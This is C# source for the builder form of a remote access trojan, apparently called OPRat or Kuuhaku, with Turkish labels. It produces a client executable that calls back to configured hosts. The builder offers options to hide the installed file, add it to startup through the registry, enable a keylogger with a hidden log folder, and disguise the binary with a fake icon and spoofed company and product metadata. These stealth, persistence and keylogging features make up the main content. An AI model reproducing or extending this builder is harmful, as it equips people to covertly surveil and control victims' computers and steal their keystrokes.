using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Windows.Forms;
using xServer.KuuhakuCekirdek.Kurucu;
using xServer.KuuhakuCekirdek.Veri;
using xServer.KuuhakuCekirdek.Yardımcılar;

namespace xServer.Formlar
{
    public partial class FrmKurucu : Form
    {
        private readonly BindingList<Sunucu> _hosts = new BindingList<Sunucu>();
        private bool _changed;
        private bool _profileLoaded;

        public FrmKurucu()
        {
            InitializeComponent();
        }

        private void LoadProfile(string profilename)
        {
            var profile = new KurulumProfili(profilename);

            foreach (var host in HostYardımcısı.GetHostsList(profile.Hostlar))
                _hosts.Add(host);
            Hostlar.DataSource = new BindingSource(_hosts, null);

            txtTag.Text = profile.Etiket;
            txtPassword.Text = profile.Şifre;
            numericUpDownDelay.Value = profile.Gecikme;
            txtMutex.Text = profile.Mutex;
            chkInstall.Checked = profile.ClientKurumu;
            txtInstallname.Text = profile.Yüklemeİsmi;
            GetInstallPath(profile.KurulumDizini).Checked = true;
            txtInstallsub.Text = profile.SubDirYükle;
            chkHide.Checked = profile.DosyaSakla;
            chkStartup.Checked = profile.BaşlangıcaEkle;
            txtRegistryKeyName.Text = profile.RegistryName;
            chkChangeIcon.Checked = profile.İkonDeğiştir;
            txtIconPath.Text = profile.IconPath;
            chkChangeAsmInfo.Checked = profile.ChangeAsmInfo;
            chkKeylogger.Checked = profile.Keylogger;
            txtLogDirectoryName.Text = profile.LogDirectoryName;
            chkHideLogDirectory.Checked = profile.HideLogDirectory;
            txtProductName.Text = profile.Ürünİsmi;
            txtDescription.Text = profile.Açıklama;
            txtCompanyName.Text = profile.Şirketİsmi;
            txtCopyright.Text = profile.TelifHakkı;
            txtTrademarks.Text = profile.Trademarks;
            txtOriginalFilename.Text = profile.OriginalFilename;
            txtProductVersion.Text = profile.ÜrünVersiyonu;
            txtFileVersion.Text = profile.DosyaVersiyonu;

            _profileLoaded = true;
        }

        private void SaveProfile(string profilename)
        {
            var profile = new KurulumProfili(profilename);

            profile.Etiket = txtTag.Text;
            profile.Hostlar = HostYardımcısı.GetRawHosts(_hosts);
            profile.Şifre = txtPassword.Text;
            profile.Gecikme = (int)numericUpDownDelay.Value;
            profile.Mutex = txtMutex.Text;
            profile.ClientKurumu = chkInstall.Checked;
            profile.Yüklemeİsmi = txtInstallname.Text;
            profile.KurulumDizini = GetInstallPath();
            profile.SubDirYükle = txtInstallsub.Text;
            profile.DosyaSakla = chkHide.Checked;
            profile.BaşlangıcaEkle = chkStartup.Checked;
            profile.RegistryName = txtRegistryKeyName.Text;
            profile.İkonDeğiştir = chkChangeIcon.Checked;
            profile.IconPath = txtIconPath.Text;
            profile.ChangeAsmInfo = chkChangeAsmInfo.Checked;
            profile.Keylogger = chkKeylogger.Checked;
            profile.LogDirectoryName = txtLogDirectoryName.Text;
            profile.HideLogDirectory = chkHideLogDirectory.Checked;
            profile.Ürünİsmi = txtProductName.Text;
            profile.Açıklama = txtDescription.Text;
            profile.Şirketİsmi = txtCompanyName.Text;
            profile.TelifHakkı = txtCopyright.Text;
            profile.Trademarks = txtTrademarks.Text;
            profile.OriginalFilename = txtOriginalFilename.Text;
            profile.ÜrünVersiyonu = txtProductVersion.Text;
            profile.DosyaVersiyonu = txtFileVersion.Text;
        }

        private void FrmBuilder_Load(object sender, EventArgs e)
        {
            LoadProfile("Varsayılan");

            numericUpDownPort.Value = Ayarlar.ListenPort;

            UpdateInstallationControlStates();
            UpdateStartupControlStates();
            UpdateAssemblyControlStates();
            UpdateIconControlStates();
        }

        private void FrmBuilder_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (_changed &&
                MessageBox.Show("Şu anki ayarlarınızı kaydetmek ister misiniz?", "Değişiklik Tespit Edilmiştir.",
                    MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
            {
                SaveProfile("Varsayılan");
            }
        }

        private void btnAddHost_Click(object sender, EventArgs e)
        {
            if (txtHost.Text.Length < 1) return;

            HasChanged();

            var host = txtHost.Text;
            ushort port = (ushort) numericUpDownPort.Value;

            _hosts.Add(new Sunucu {Hostname = host, Port = port});
            txtHost.Text = "";
        }

        private bool CheckForEmptyInput()
        {
            return (!string.IsNullOrWhiteSpace(txtTag.Text) && !string.IsNullOrWhiteSpace(txtMutex.Text) &&
                    // Genel Ayarlar
                    _hosts.Count > 0 && !string.IsNullOrWhiteSpace(txtPassword.Text) && // Bağlantı
                    (!chkInstall.Checked || (chkInstall.Checked && !string.IsNullOrWhiteSpace(txtInstallname.Text))) &&
                    (!chkStartup.Checked || (chkStartup.Checked && !string.IsNullOrWhiteSpace(txtRegistryKeyName.Text))));
            // Yükleme
        }

        private KurulumAyarları ValidateInput()
        {
            var options = new KurulumAyarları();
            if (!CheckForEmptyInput())
            {
                MessageBox.Show("Lütfen gerekli bütün boşlukları doldurunuz!", "Build Başarısız!", MessageBoxButtons.OK,
                    MessageBoxIcon.Information);
                return options;
            }

            options.Tag = txtTag.Text;
            options.Mutex = txtMutex.Text;
            options.RawHosts = HostYardımcısı.GetRawHosts(_hosts);
            options.Password = txtPassword.Text;
            options.Delay = (int)numericUpDownDelay.Value;
            options.IconPath = txtIconPath.Text;
            options.Version = Application.ProductVersion;
            options.InstallPath = GetInstallPath();
            options.InstallSub = txtInstallsub.Text;
            options.InstallName = txtInstallname.Text + ".exe";
            options.StartupName = txtRegistryKeyName.Text;
            options.Install = chkInstall.Checked;
            options.Startup = chkStartup.Checked;
            options.HideFile = chkHide.Checked;
            options.Keylogger = chkKeylogger.Checked;
            options.LogDirectoryName = txtLogDirectoryName.Text;
            options.HideLogDirectory = chkHideLogDirectory.Checked;

            if (options.Password.Length < 3)
            {
                MessageBox.Show("Lütfen en az 3 karakterden oluşan güvenli bir şifre ayarlayınız..",
                    "Build Başarısız!", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return options;
            }

            if (!File.Exists("client.bin"))
            {
                MessageBox.Show(
                    "\"client.bin\" dosyası bulunamadı. OPRat ile aynı klasör içerisinde olduğundan emin olunuz..",
                    "Build Başarısız!", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return options;
            }

            if (options.RawHosts.Length < 2)
            {
                MessageBox.Show("Lütfen bağlanılacak geçerli bir host adresi giriniz..", "Build Başarısız",
                    MessageBoxButtons.OK,
                    MessageBoxIcon.Error);
                return options;
            }

            if (chkChangeIcon.Checked)
            {
                if (string.IsNullOrWhiteSpace(options.IconPath) || !File.Exists(options.IconPath))
                {
                    MessageBox.Show("Lütfen geçerli bir ikon dizini seçiniz.", "Build Başarısız", MessageBoxButtons.OK,
                        MessageBoxIcon.Error);
                    return options;
                }
            }
            else
                options.IconPath = string.Empty;

            if (chkChangeAsmInfo.Checked)
            {
                if (!FormatYardımcısı.IsValidVersionNumber(txtProductVersion.Text))
                {
                    MessageBox.Show("Lütfen geçerli bir ürün version numarası giriniz.!\nÖrneğin: 1.2.3.4", "Build Başarısız",
                        MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return options;
                }

                if (!FormatYardımcısı.IsValidVersionNumber(txtFileVersion.Text))
                {
                    MessageBox.Show("Lütfen geçerli bir dosya version numarası giriniz.!\nÖrneğin: 1.2.3.4", "Build Başarısız",
                        MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return options;
                }

                options.AssemblyInformation = new string[8];
                options.AssemblyInformation[0] = txtProductName.Text;
                options.AssemblyInformation[1] = txtDescription.Text;
                options.AssemblyInformation[2] = txtCompanyName.Text;
                options.AssemblyInformation[3] = txtCopyright.Text;
                options.AssemblyInformation[4] = txtTrademarks.Text;
                options.AssemblyInformation[5] = txtOriginalFilename.Text;
                options.AssemblyInformation[6] = txtProductVersion.Text;
                options.AssemblyInformation[7] = txtFileVersion.Text;
            }

            using (SaveFileDialog sfd = new SaveFileDialog())
            {
                sfd.Title = "Clienti Kaydet";
                sfd.Filter = "Exeler *.exe|*.exe";
                sfd.RestoreDirectory = true;
                sfd.FileName = "Kuuhaku.exe";
                if (sfd.ShowDialog() != DialogResult.OK)
                {
                    return options;
                }
                options.OutputPath = sfd.FileName;
            }

            if (string.IsNullOrEmpty(options.OutputPath))
            {
                MessageBox.Show("Lütfen geçerli bir kaydetme klasörü seçiniz..", "Build Başarısız", MessageBoxButtons.OK,
                    MessageBoxIcon.Error);
                return options;
            }

            options.ValidationSuccess = true;
            return options;
        }

        private void btnBuild_Click(object sender, EventArgs e)
        {
            var options = ValidateInput();
            if (!options.ValidationSuccess)
                return;

            try
            {
                ClientBuilder.Build(options);

                MessageBox.Show("Client başarılıyla kuruldu!\nKaydedilen Yer: " + options.OutputPath, "Build Başarılı",
                    MessageBoxButtons.OK,
                    MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show(
                    string.Format("Bir Hata Oluştu!\n\nHata Mesajı: {0}\nStack Trace:\n{1}", ex.Message,
                        ex.StackTrace), "Build Başarısız", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void RefreshPreviewPath()
        {
            string path = string.Empty;
            if (rbAppdata.Checked)
                path =
                    Path.Combine(
                        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                            txtInstallsub.Text), txtInstallname.Text);
            else if (rbProgramFiles.Checked)
                path =
                    Path.Combine(
                        Path.Combine(
                            Environment.GetFolderPath(PlatformYardımcısı.Mimari == 64
                                ? Environment.SpecialFolder.ProgramFilesX86
                                : Environment.SpecialFolder.ProgramFiles), txtInstallsub.Text), txtInstallname.Text);
            else if (rbSystem.Checked)
                path =
                    Path.Combine(
                        Path.Combine(
                            Environment.GetFolderPath(PlatformYardımcısı.Mimari == 64
                                ? Environment.SpecialFolder.SystemX86
                                : Environment.SpecialFolder.System), txtInstallsub.Text), txtInstallname.Text);

            Invoke((MethodInvoker) delegate { txtPreviewPath.Text = path + ".exe"; });
        }

        private short GetInstallPath()
        {
            if (rbAppdata.Checked) return 1;
            if (rbProgramFiles.Checked) return 2;
            if (rbSystem.Checked) return 3;
            throw new ArgumentException("YüklemeDizini");
        }

        private RadioButton GetInstallPath(short installPath)
        {
            switch (installPath)
            {
                case 1:
                    return rbAppdata;
                case 2:
                    return rbProgramFiles;
                case 3:
                    return rbSystem;
                default:
                    throw new ArgumentException("YüklemeDizini");
            }
        }

        private void UpdateAssemblyControlStates()
        {
            txtProductName.Enabled = chkChangeAsmInfo.Checked;
            txtDescription.Enabled = chkChangeAsmInfo.Checked;
            txtCompanyName.Enabled = chkChangeAsmInfo.Checked;
            txtCopyright.Enabled = chkChangeAsmInfo.Checked;
            txtTrademarks.Enabled = chkChangeAsmInfo.Checked;
            txtOriginalFilename.Enabled = chkChangeAsmInfo.Checked;
            txtFileVersion.Enabled = chkChangeAsmInfo.Checked;
            txtProductVersion.Enabled = chkChangeAsmInfo.Checked;
        }

        private void UpdateIconControlStates()
        {
            txtIconPath.Enabled = chkChangeIcon.Checked;
            btnBrowseIcon.Enabled = chkChangeIcon.Checked;
        }

        private void UpdateStartupControlStates()
        {
            txtRegistryKeyName.Enabled = chkStartup.Checked;
        }

        private void UpdateInstallationControlStates()
        {
            txtInstallname.Enabled = chkInstall.Checked;
            rbAppdata.Enabled = chkInstall.Checked;
            rbProgramFiles.Enabled = chkInstall.Checked;
            rbSystem.Enabled = chkInstall.Checked;
            txtInstallsub.Enabled = chkInstall.Checked;
            chkHide.Enabled = chkInstall.Checked;
        }

        private void HasChanged()
        {
            if (!_changed && _profileLoaded)
                _changed = true;
        }

        private void HasChangedSetting(object sender, EventArgs e)
        {
            HasChanged();
        }

        private void HasChangedSettingAndFilePath(object sender, EventArgs e)
        {
            HasChanged();

            RefreshPreviewPath();
        }

        private void label9_Click(object sender, EventArgs e)
        {
        }

        private void surveillanceTab_Click(object sender, EventArgs e)
        {
        }

        #region "Context Menu"

        private void removeHostToolStripMenuItem_Click(object sender, EventArgs e)
        {
            HasChanged();

            List<string> selectedHosts = (from object arr in Hostlar.SelectedItems select arr.ToString()).ToList();

            foreach (var item in selectedHosts)
            {
                foreach (var host in _hosts)
                {
                    if (item == host.ToString())
                    {
                        _hosts.Remove(host);
                        break;
                    }
                }
            }
        }

        private void clearToolStripMenuItem_Click(object sender, EventArgs e)
        {
            HasChanged();

            _hosts.Clear();
        }

        #endregion

        #region "Misc"

        private void chkShowPass_CheckedChanged(object sender, EventArgs e)
        {
            txtPassword.PasswordChar = (chkShowPass.Checked) ? '\0' : '•';
        }

        private void txtInstallname_KeyPress(object sender, KeyPressEventArgs e)
        {
            e.Handled = ((e.KeyChar == '\\' || DosyaYardımcısı.CheckPathForIllegalChars(e.KeyChar.ToString())) &&
                         !char.IsControl(e.KeyChar));
        }

        private void txtInstallsub_KeyPress(object sender, KeyPressEventArgs e)
        {
            e.Handled = ((e.KeyChar == '\\' || DosyaYardımcısı.CheckPathForIllegalChars(e.KeyChar.ToString())) &&
                         !char.IsControl(e.KeyChar));
        }

        private void txtLogDirectoryName_KeyPress(object sender, KeyPressEventArgs e)
        {
            e.Handled = ((e.KeyChar == '\\' || DosyaYardımcısı.CheckPathForIllegalChars(e.KeyChar.ToString())) &&
                         !char.IsControl(e.KeyChar));
        }

        private void btnMutex_Click(object sender, EventArgs e)
        {
            HasChanged();

            txtMutex.Text = FormatYardımcısı.GenerateMutex();
        }

        private void chkInstall_CheckedChanged(object sender, EventArgs e)
        {
            HasChanged();

            UpdateInstallationControlStates();
        }

        private void chkStartup_CheckedChanged(object sender, EventArgs e)
        {
            HasChanged();

            UpdateStartupControlStates();
        }

        private void chkChangeAsmInfo_CheckedChanged(object sender, EventArgs e)
        {
            HasChanged();

            UpdateAssemblyControlStates();
        }

        private void btnBrowseIcon_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Title = "İkon Seçiniz";
                ofd.Filter = "İkonlar *.ico|*.ico";
                ofd.Multiselect = false;
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    txtIconPath.Text = ofd.FileName;
                    iconPreview.Image = Bitmap.FromHicon(new Icon(ofd.FileName, new Size(64, 64)).Handle);
                }
            }
        }

        private void chkChangeIcon_CheckedChanged(object sender, EventArgs e)
        {
            HasChanged();

            UpdateIconControlStates();
        }

        #endregion

        private void txtPreviewPath_TextChanged(object sender, EventArgs e)
        {

        }
    }
}